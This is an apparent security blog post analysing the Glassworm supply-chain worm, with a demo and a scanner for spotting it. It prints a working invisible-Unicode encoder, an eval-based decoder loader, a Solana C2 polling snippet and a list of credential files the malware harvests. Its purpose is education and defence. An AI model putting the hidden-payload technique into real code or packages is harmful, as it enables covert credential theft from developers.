# Glassworm: The Invisible Malware Hiding in Your Code Editor — How It Works and How to Defend Against It

*A technical breakdown of the Unicode obfuscation attack that compromised 400+ packages, with a working POC and detection tool.*

---

Look at this line of JavaScript:

```javascript
const payload = ``;
```

An empty string, right? Nothing to see here. Your code editor shows nothing. GitHub's diff view shows nothing. Your linter passes. Your code review passes.

But that "empty" string actually contains **1,115 bytes of executable JavaScript** — encoded in invisible Unicode characters that no human eye can detect.

This is **Glassworm** — a self-propagating supply-chain worm that has compromised 400+ components across npm, PyPI, VS Code extensions, and GitHub repositories since October 2025. It steals developer credentials, injects malware into your projects, and uses Solana blockchain transactions as an unkillable command-and-control channel.

In this article, I'll show you exactly how it works, with a working proof-of-concept you can run yourself — and more importantly, how to detect and defend against it.

---

## What is Glassworm?

Glassworm is not a traditional CVE vulnerability. It's an **active malware campaign** — now in its 5th wave — targeting the developer ecosystem through supply-chain poisoning.

### Timeline

| Date | Event |
|------|-------|
| Oct 2025 | 7 malicious OpenVSX extensions discovered (35,800 downloads) |
| Jan 2026 | 72 additional extensions found on OpenVSX |
| Mar 2026 | 150+ GitHub repos compromised via stolen tokens |
| Mar 2026 | ForceMemo variant targets Python repos |
| Mar 2026 | PolinRider (DPRK/Lazarus) leverages stolen credentials |

The campaign has expanded from VS Code extensions to npm packages, PyPI packages, GitHub repositories, browser extensions, and most recently — MCP servers (Model Context Protocol tools used by AI coding assistants).

### Why Now?

The underlying technique — hiding data in invisible Unicode characters — has been known since 2021 ([CVE-2021-42574](https://nvd.nist.gov/vuln/detail/cve-2021-42574)). But Glassworm weaponized it at scale by combining three innovations:

1. **Blockchain-based C2** — Solana transaction memos as dead drops (can't be taken down)
2. **Self-propagation** — stolen tokens automatically inject malware into victims' repos
3. **Supply-chain delivery** — IDE extensions and packages that developers install voluntarily

---

## The Invisible Payload: How Unicode Obfuscation Works

### The Encoding Scheme

Unicode defines a set of characters called **Variation Selectors** — their original purpose is to modify how the preceding character renders (like choosing between emoji styles). They come in two ranges:

```
U+FE00  to U+FE0F   — 16 Variation Selectors
U+E0100 to U+E01EF  — 240 Supplementary Variation Selectors
```

That's **256 characters** — exactly enough to represent every possible byte value (0-255). And critically, these characters are rendered with **zero width** by virtually every text editor, terminal, and code review tool.

### The Encoder

Glassworm maps each byte of a JavaScript payload to one invisible character:

```javascript
function encodeByte(byte) {
  if (byte < 16) {
    return String.fromCodePoint(0xFE00 + byte);     // Byte 0-15
  }
  return String.fromCodePoint(0xE0100 + byte - 16);  // Byte 16-255
}

function encode(text) {
  const buffer = Buffer.from(text, 'utf-8');
  let result = '';
  for (const byte of buffer) {
    result += encodeByte(byte);
  }
  return result;  // Looks empty. Contains the full payload.
}
```

### The Decoder

The real Glassworm decoder found in the wild looks like this:

```javascript
const s = v => [...v].map(w => (
  w = w.codePointAt(0),
  w >= 0xFE00 && w <= 0xFE0F ? w - 0xFE00 :
  w >= 0xE0100 && w <= 0xE01EF ? w - 0xE0100 + 16 : null
)).filter(n => n !== null);

eval(Buffer.from(s(``)).toString('utf-8'));
//                  ^^ looks empty — actually contains the encoded payload
```

### What You See vs. What's Really There

**In your code editor:**
```javascript
const x = "";   // Appears to be an empty string
```

**In a hex dump:**
```
63 6F 6E 73 74 20 78 20 3D 20 22 F3 A0 85 A3 F3
A0 85 A4 F3 A0 85 A5 F3 A0 85 A6 F3 A0 85 A7 ...
// hundreds of invisible 4-byte sequences
```

Each invisible character is 3-4 bytes in UTF-8, but renders as **zero pixels wide**. A 1KB payload becomes ~4KB of invisible characters — still small enough to hide in any file.

### Why Detection Tools Miss It

- **Code editors** (VS Code, Vim, Sublime): render variation selectors as zero-width
- **GitHub/GitLab diff view**: invisible in pull request reviews
- **Linters** (ESLint, Prettier): don't flag Unicode characters by default
- **npm audit / Snyk / Dependabot**: check for known CVEs, not payload content
- **Antivirus**: sees "Node.js script reading files and calling APIs" — legitimate behavior

---

## The Kill Chain: From Install to Compromise

### Stage 1: Initial Infection

Three primary vectors — all exploiting normal developer behavior:

**VS Code Extension** — the most common vector:
```
Developer installs "AI Code Helper" from marketplace
  → Extension activate() runs automatically
  → Invisible payload decodes and executes
  → Developer has no idea
```

**npm Package** — via postinstall hooks:
```
npm install totally-legit-linter
  → npm runs "postinstall": "node i.js" automatically
  → i.js contains invisible payload
  → Malware executes during install
```

**GitHub Force-Push** — using stolen tokens:
```
Attacker has your stolen GitHub token
  → Force-pushes commit with invisible payload into YOUR repo
  → Your collaborators pull and run the code
  → Their tokens get stolen → cycle repeats
```

### Stage 2: Credential Harvesting

Once running, the payload targets:
- **GitHub tokens** — from VS Code extension storage, git credential managers, `GITHUB_TOKEN` env var
- **npm tokens** — from `~/.npmrc`
- **SSH keys** — from `~/.ssh/`
- **AWS credentials** — from `~/.aws/credentials`
- **49+ crypto wallet extensions** — MetaMask, Phantom, Ledger, Trezor, etc.

Data is staged to a temp directory, zipped, and POSTed to the attacker's server.

### Stage 3: Propagation (This is what makes it a worm)

Stolen credentials are used immediately to:
1. Force-push malware into the victim's maintained repositories
2. Publish malicious extensions under hijacked marketplace accounts
3. Invite bot accounts as collaborators on repos

Each infected developer infects their downstream users — **exponential spread**.

### Stage 4: Persistent RAT (SeroXen)

The final payload is a modified SeroXen RAT with:
- Keylogger
- Screenshot capture
- VNC remote access
- Chrome extension installer (fake Google Docs for surveillance)
- Registry persistence via encrypted scheduled tasks

### Stage 5: Blockchain C2

The malware polls a **Solana wallet address** for new instructions:

```javascript
// Malware reads Solana blockchain (public API, no auth needed)
fetch('https://api.mainnet-beta.solana.com', {
  method: 'POST',
  body: JSON.stringify({
    jsonrpc: '2.0',
    method: 'getSignaturesForAddress',
    params: ['<attacker-wallet-address>']
  })
});
// → Reads memo field of latest transaction
// → Memo contains Base64-encoded payload URL
// → Fetches new payload from URL
```

Why Solana? Transaction costs ~$0.0001, confirms in 0.4 seconds, and **transactions cannot be deleted from the blockchain**. When security teams take down a payload URL, the attacker sends a new transaction for $0.0001 pointing to a new URL. Between Nov 2025 and Mar 2026, researchers documented 50+ such updates.

---

## Try It Yourself: POC Demo

I built an educational proof-of-concept to demonstrate the attack and detection. The full code is available on GitHub: **[glassworm-poc](https://github.com/junbjnnn/glassworm-poc)**

> ⚠️ **Educational purposes only.** The POC runs in a sandboxed VM with restricted module access. No data is exfiltrated.

### Encode a payload

```bash
node attack/glassworm-encoder.js --file attack/payload-source.js
# ✓ Encoded 1115 bytes → attack/payload-demo.js
#   The payload is now invisible in code editors.
```

### Run the hidden payload

```bash
npm run decode
```

Output:
```
╔══════════════════════════════════════════════════════════╗
║  ⚠️  GLASSWORM POC — ATTACK SIMULATION STARTING         ║
╚══════════════════════════════════════════════════════════╝

Decoded 2202 invisible chars → 1115 bytes

=== System Info ===
Platform: darwin
Node: v22.12.0
User: your_username

=== Environment Variable Keys (secrets exposed!) ===
Found 94 env vars:
GITHUB_TOKEN, AWS_SECRET_KEY, NPM_TOKEN, SSH_AUTH_SOCK, ...

=== ~/.ssh/known_hosts (first 500 chars) ===
192.168.1.26 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...

⚠️  Real malware would exfiltrate ALL of this to a C2 server.
```

The demo payload can read your environment variables, SSH hosts, and system information — all from a string that **looks completely empty** in your editor.

---

## Detection: Building a Scanner

The POC includes a detection CLI tool that scans for Glassworm indicators.

### Core Detection Rule: Unicode Cluster Detection

```javascript
function isVariationSelector(cp) {
  return (cp >= 0xFE00 && cp <= 0xFE0F) ||
         (cp >= 0xE0100 && cp <= 0xE01EF);
}

// Flag sequences of 10+ consecutive variation selectors
function findUnicodeClusters(content, threshold = 10) {
  let clusterCount = 0;
  for (const char of content) {
    if (isVariationSelector(char.codePointAt(0))) {
      clusterCount++;
    } else {
      if (clusterCount >= threshold) return true; // FOUND!
      clusterCount = 0;
    }
  }
  return clusterCount >= threshold;
}
```

### Detection Rules

| Rule | Severity | What It Detects |
|------|----------|----------------|
| `UNICODE_CLUSTER` | CRITICAL | 10+ consecutive invisible variation selectors |
| `EVAL_BUFFER` | HIGH | `eval()` or `new Function()` with Buffer decode |
| `KNOWN_MARKER` | CRITICAL | Known Glassworm variable `lzcdrtfxyqiplpd` |
| `SOLANA_ENDPOINT` | MEDIUM | Solana RPC endpoints in code |
| `CREDENTIAL_ACCESS` | HIGH | Code reading `.ssh`, `.npmrc`, `.gitconfig` |
| `POSTINSTALL_SUSPICIOUS` | HIGH | Suspicious `postinstall` scripts in package.json |

### Running the Scanner

```bash
# Scan a project directory
node detector/glassworm-detector-cli.js scan ./my-project

# JSON output for CI/CD pipelines
node detector/glassworm-detector-cli.js scan ./my-project --format json
```

Output:
```
🔍 Glassworm Detector v0.1.0
Scanning: ./samples (7 files)

CRITICAL  hidden-payload.js:12:13  UNICODE_CLUSTER
          1115 invisible variation selectors in sequence

HIGH      eval-pattern.js:3:1      EVAL_BUFFER
          eval() with Buffer.from decoded string

Results: 9 findings (2 critical, 5 high, 2 medium)
```

---

## How to Protect Yourself

### Immediate Actions (Do These Today)

- [ ] **Audit your VS Code extensions** — Remove anything from unverified publishers. Check `~/.vscode/extensions/` for extensions you don't recognize.
- [ ] **Revoke and rotate ALL tokens** — GitHub PATs, npm tokens, AWS keys, SSH keys. Assume they may be compromised.
- [ ] **Run GlassWorm Hunter** on your projects — [github.com/afine-security/glassworm-hunter](https://github.com/afine-security/glassworm-hunter)

### Ongoing Protection

- [ ] **Pin exact dependency versions** — Use `1.2.3` not `^1.2.3`. Lock files are not enough if you run `npm update`.
- [ ] **Review postinstall scripts** — Run `npm install --ignore-scripts` first, then audit scripts before enabling.
- [ ] **Enable Unicode highlighting in VS Code** — `"editor.unicodeHighlight.nonBasicASCII": true`
- [ ] **Use commit signing** — `git config commit.gpgsign true` — makes force-push attacks harder to hide.
- [ ] **Separate dev and sensitive environments** — Don't store production credentials on machines that install random packages.
- [ ] **Monitor for force-pushes** — Set up GitHub branch protection rules requiring PR reviews.

---

## Closing Thoughts

The scariest part of Glassworm isn't the Unicode trick itself — that's been known since 2021. It's that **your daily workflow IS the attack vector**. You don't need to click a suspicious link, open a malicious attachment, or disable your firewall. You just need to do what you do every day: `npm install`, install a VS Code extension, or `git pull` a colleague's changes.

The developer ecosystem runs on trust — trust in package registries, trust in marketplace reviews, trust in our teammates' commits. Glassworm exploits that trust at every level.

**Share this with your team. Audit your extensions today. Rotate your tokens now.**

The invisible threat is real, and it's already in the supply chain.

---

*The full POC code (encoder, decoder, detection tool with 21 passing tests) is available at: [glassworm-poc on GitHub](https://github.com/junbjnnn/glassworm-poc)*

---

### References

- [GlassWorm Supply-Chain Attack — The Hacker News](https://thehackernews.com/2026/03/glassworm-supply-chain-attack-abuses-72.html)
- [Glassworm Returns — Aikido.dev](https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode)
- [GlassWorm hits 400+ repos — Bleeping Computer](https://www.bleepingcomputer.com/news/security/glassworm-malware-hits-400-plus-code-repos-on-github-npm-vscode-openvsx/)
- [ForceMemo: Python Repos Compromised — SecurityWeek](https://www.securityweek.com/forcememo-python-repositories-compromised-in-glassworm-aftermath/)
- [GlassWorm Solana Dead Drops — The Hacker News](https://thehackernews.com/2026/03/glassworm-malware-uses-solana-dead.html)
- [PolinRider DPRK Technical Dossier — GitHub](https://github.com/OpenSourceMalware/PolinRider)
- [GlassWorm Hunter Detection Tool — Afine Security](https://github.com/afine-security/glassworm-hunter)
- [CVE-2021-42574 — NVD](https://nvd.nist.gov/vuln/detail/cve-2021-42574)
- [Defending Against Glassworm — Snyk](https://snyk.io/articles/defending-against-glassworm/)
